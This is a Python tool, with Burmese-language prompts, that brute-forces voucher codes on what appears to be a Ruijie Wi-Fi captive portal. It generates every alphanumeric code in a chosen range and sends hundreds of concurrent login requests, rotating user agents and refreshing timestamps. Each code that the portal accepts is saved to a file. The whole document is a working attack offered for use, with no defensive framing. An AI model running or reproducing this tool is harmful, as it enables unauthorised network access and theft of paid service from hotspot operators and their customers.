import asyncio
import httpx
import os
import time
import random
import string
import urllib.parse
from datetime import datetime

portal_url = ""
PROGRESS_FILE = "scan_progress.txt"
FOUND_FILE = "found_codes.txt"
REPORT_FILE = "scan_report.html"

# Premium ANSI Color Palette
G = '\033[1;92m'  # Neon Green
Y = '\033[1;93m'  # Neon Yellow
R = '\033[1;91m'  # Neon Red
C = '\033[1;96m'  # Cyan Glow
W = '\033[1;97m'  # Pure White
M = '\033[1;95m'  # Neon Magenta
D = '\033[2m'     # Dim
X = '\033[0m'     # Reset

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
]

def clear_screen():
    os.system('clear')

def auto_refresh_timestamp(p_url):
    try:
        parsed_url = urllib.parse.urlparse(p_url)
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
        if 'timestamp' in query_params:
            query_params['timestamp'] = [str(int(time.time()))]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
    except:
        pass
    return p_url

def verify_url_connection(p_url):
    print(f"\n {Y}⚡ [PRE-FLIGHT] ဆာဗာနှင့် ချိတ်ဆက်မှုကို စစ်ဆေးနေပါပြီ...{X}")
    try:
        refreshed_url = auto_refresh_timestamp(p_url)
        with httpx.Client(timeout=3.0, follow_redirects=True) as client:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = client.get(refreshed_url, headers=headers)
            if response.status_code == 200:
                return True, refreshed_url, "Connection Successful! (Status: 200 OK)"
            else:
                return False, refreshed_url, f"Server responded with status code: {response.status_code}"
    except Exception as e:
        return False, p_url, f"Connection Error: {str(e)}"

def notify_success(code):
    print("\a", end="")
    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os.system(f"echo '[{timestamp_str}] FOUND CODE: {code}' >> {FOUND_FILE}")

async def verify_voucher_async(client, code, p_url):
    try:
        active_url = auto_refresh_timestamp(p_url)
        target_url = active_url.replace("stage=portal", f"stage=login&token={code}")
        headers = {'User-Agent': random.choice(USER_AGENTS), 'Connection': 'keep-alive', 'Referer': active_url}
        response = await client.get(target_url, headers=headers, timeout=0.8)
        if response.status_code == 200:
            res_text = response.text.lower()
            if any(kw in res_text for kw in ["success", "welcome", "auth complete", "authenticated", "successful", "logged in"]):
                return code, True
        return code, False
    except:
        return code, False

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                return int(f.read().strip())
        except:
            return 0
    return 0

def save_progress(index):
    try:
        with open(PROGRESS_FILE, "w") as f:
            f.write(str(index))
    except:
        pass

async def run_async_scanner(codes, p_url):
    total = len(codes)
    start_idx = load_progress()
    
    if start_idx > 0:
        res = input(f"\n{Y} ⚡ ယခင်ကျန်ခဲ့သောနေရာမှ ဆက်စပ်လိုပါသလား ({start_idx:,} ခု ပြီးပြီး) [y/n]: {X}").strip().lower()
        if res != 'y':
            start_idx = 0

    clear_screen()
    print(f"{C}╔══════════════════════════════════════════════╗{X}")
    print(f"{C}║{G}     🚀 ULTIMATE STABLE TURBO ENGINE v4.0     {C}║{X}")
    print(f"{C}╚══════════════════════════════════════════════╝{X}")
    print(f" {W}TOTAL CODES TO SCAN :{X} {C}{total:,}{X}\n")
    
    success_count = 0
    start_time = time.time()
    found_codes = []
    completed = start_idx
    active_codes = codes[start_idx:]
    
    limits = httpx.Limits(max_keepalive_connections=200, max_connections=400)
    
    cookies = {}
    try:
        with httpx.Client(timeout=3.0, follow_redirects=True) as init_client:
            init_res = init_client.get(auto_refresh_timestamp(p_url))
            cookies = init_res.cookies
    except:
        pass

    async with httpx.AsyncClient(limits=limits, cookies=cookies, follow_redirects=True) as client:
        batch_size = 200
        for i in range(0, len(active_codes), batch_size):
            batch = active_codes[i:i + batch_size]
            tasks = [verify_voucher_async(client, code, p_url) for code in batch]
            
            try:
                results = await asyncio.gather(*tasks, return_exceptions=True)
            except:
                results = [(code, False) for code in batch]
            
            current_code = batch[-1]
            
            for res in results:
                completed += 1
                if isinstance(res, tuple) and len(res) == 2:
                    code, is_valid = res
                    if is_valid:
                        success_count += 1
                        found_codes.append(code)
                        notify_success(code)
                        print(f"\n{G}╔══════════════════════════════════════════════╗{X}")
                        print(f"{G}║  🔥 SUCCESS! VOUCHER CODE FOUND & SAVED      ║{X}")
                        print(f"{G}║  ➔ MATCHED CODE : [ {code} ]                 ║{X}")
                        print(f"{G}╚══════════════════════════════════════════════╝{X}")
            
            if completed % 100 == 0:
                save_progress(completed)
            
            elapsed = time.time() - start_time
            speed = (completed - start_idx) / elapsed if elapsed > 0 else 0
            percent = (completed / total) * 100
            
            bar_len = 16
            filled = int(bar_len * completed // total)
            bar = "█" * filled + "░" * (bar_len - filled)
            
            status = f"\r {C}[{bar}]{X} {W}{percent:.1f}%{X} | {completed:,}/{total:,} | 🔍 {Y}{current_code}{X} | {G}⚡{speed:.1f}r/s{X}"
            print(status, end="", flush=True)

    if os.path.exists(PROGRESS_FILE):
        try:
            os.remove(PROGRESS_FILE)
        except:
            pass
        
    print(f"\n\n{C}════════════════════════════════════════════════{X}")
    print(f" {W}STATUS      :{X} {G}SCAN COMPLETED{X}")
    print(f" {W}MATCHED     :{X} {G}{success_count} Code(s){X}")
    if found_codes:
        print(f" {W}FOUND CODES :{X} {Y}{', '.join(found_codes)}{X}")
    print(f"{C}════════════════════════════════════════════════{X}")
    input(f"\n{W} Press [ENTER] to return to dashboard...{X}")

def main_menu():
    global portal_url
    while True:
        clear_screen()
        print(f"{C}╔══════════════════════════════════════════════╗{X}")
        print(f"{C}║{W}      💎 RUIJIE NEXUS ELITE SUITE v4.0        {C}║{X}")
        print(f"{C}╠══════════════════════════════════════════════╣{X}")
        status_box = f"{G}● SECURELY CONNECTED{X}" if portal_url else f"{R}○ DISCONNECTED (NO URL){X}"
        print(f"{C}║{X} STATUS : {status_box:<35} {C}║{X}")
        print(f"{C}╚══════════════════════════════════════════════╝{X}")
        print(f"  {Y}[1]{X} ✍️ Manual URL Input & Verify")
        print(f"  {Y}[2]{X} 🔠 Smart Range Alphanumeric Scan (A မှ Z / Range သတ်မှတ်ရန်)")
        print(f"  {Y}[3]{X} 🚪 Exit")
        
        choice = input(f"\n{W}┌─[ Select Option ]\n └──╼ {X}").strip()
        
        if choice == '1':
            clear_screen()
            manual_url = input(f" {Y}Paste Full Portal URL ➔ {X}").strip()
            if manual_url.startswith("http"):
                is_valid, final_u, msg = verify_url_connection(manual_url)
                if is_valid:
                    portal_url = final_u
                    print(f"\n{G}✔ URL PARSED & VERIFIED SUCCESSFULLY!{X}")
                else:
                    print(f"\n{R}✖ Error: {msg}{X}")
            input(f"\n{W} Press [ENTER] to continue...{X}")
            
        elif choice == '2':
            if not portal_url:
                print(f"{R}✖ ERROR: Portal URL not configured. Please use Option 1 first.{X}")
                input(f"\n{W} Press [ENTER] to continue...{X}")
                continue
                
            clear_screen()
            start_str = input(f" {Y}စတင်မည့် စာလုံး/နံပါတ်အစ (ဥပမာ - 6 သို့မဟုတ် a): {X}").strip().lower()
            end_str = input(f" {Y}ရပ်တန့်မည့် စာလုံး/နံပါတ်အဆုံး (ဥပမာ - 7 သို့မဟုတ် z): {X}").strip().lower()
            try:
                total_length = int(input(f" {Y}စုစုပေါင်း ကုဒ်အရှည် (ဥပမာ - 6): {X}").strip())
            except:
                continue
            
            print(f"\n{Y}⚡ Generating range from '{start_str}' to '{end_str}'...{X}")
            remaining_len = total_length - len(start_str)
            charset = string.ascii_lowercase + string.digits
            codes = []
            import itertools
            
            start_char = start_str[0]
            end_char = end_str[0]
            all_chars = sorted(list(set(charset)))
            try:
                s_idx = all_chars.index(start_char)
                e_idx = all_chars.index(end_char)
                target_chars = all_chars[s_idx:e_idx+1]
            except:
                target_chars = [start_char]
            
            for ch in target_chars:
                prefix = start_str[:-1] + ch if len(start_str) > 1 else ch
                for prod in itertools.product(charset, repeat=remaining_len):
                    codes.append(prefix + "".join(prod))
            
            print(f"{G}✔ Generated {len(codes):,} codes successfully!{X}")
            time.sleep(1)
            
            try:
                asyncio.run(run_async_scanner(codes, portal_url))
            except KeyboardInterrupt:
                print(f"\n\n{Y}■ Interrupted. Returning to menu...{X}")
                input(f"\n{W} Press [ENTER] to continue...{X}")
                
        elif choice == '3':
            break

if __name__ == '__main__':
    main_menu()
